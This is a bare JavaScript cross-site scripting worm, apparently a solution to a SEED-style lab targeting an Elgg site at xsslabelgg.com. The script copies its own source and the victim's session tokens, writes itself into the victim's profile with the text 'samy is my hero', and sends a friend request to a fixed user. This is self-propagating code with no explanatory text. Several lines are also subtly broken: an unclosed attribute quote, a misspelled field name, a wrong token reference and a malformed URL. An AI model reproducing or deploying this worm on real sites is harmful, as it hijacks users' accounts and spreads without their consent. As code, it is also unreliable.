<script type="text/javascript" id="worm>
window.onload = function() {

var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
var jsCode = document.getElementById("worm").innerHTML; 
var tailTag = "</" + "script>"; 
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_token;
var token="&__elgg_token="+elgg.security.token.__elgg.token;

var accesslevel= "&accesslevel[description]=2";
var description= "&decsription="+ wormCode;
var briefdescription= "&briefdescription=samy is my hero";

var content= token + ts + userName + description + accesslevel +guid;
var sendurl= "http://www.xsslabelgg.com/action/profile/edit";

var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);

var Ajax2=null;
var sendurl= "http://www.xsslabelgg.com/action/friends/add? friend=47" + ts + token;
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
alert(jsCode);
}

</script>
